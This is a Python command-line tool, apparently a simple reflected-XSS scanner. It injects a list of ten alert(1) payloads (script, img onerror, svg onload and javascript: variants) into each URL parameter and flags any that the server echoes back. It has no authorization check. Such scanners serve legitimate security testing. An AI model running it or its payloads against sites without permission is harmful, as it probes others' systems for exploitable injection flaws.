#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor

PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input autofocus onfocus=alert(1)>',
]

def test_payload(url, param, payload):
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        r = requests.get(new_url, timeout=5)
        if payload in r.text:
            return (param, payload, new_url)
    except:
        pass
    return None

def scan_xss(url):
    print(f"\n{'='*60}")
    print(f"  XSS Scanner")
    print(f"  Target: {url}")
    print(f"{'='*60}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found")
        return
    
    print(f"[*] Testing {len(params)} parameter(s) with {len(PAYLOADS)} payloads...\n")
    
    found = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for param in params:
            for payload in PAYLOADS:
                futures.append(ex.submit(test_payload, url, param, payload))
        for future in futures:
            result = future.result()
            if result:
                found.append(result)
                param, payload, new_url = result
                print(f"  [!] XSS on '{param}'")
                print(f"      Payload: {payload}")
                print(f"      URL: {new_url}\n")
    
    print(f"\nFound: {len(found)} potential XSS")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 xss_scanner.py <url>")
        sys.exit(1)
    scan_xss(sys.argv[1])
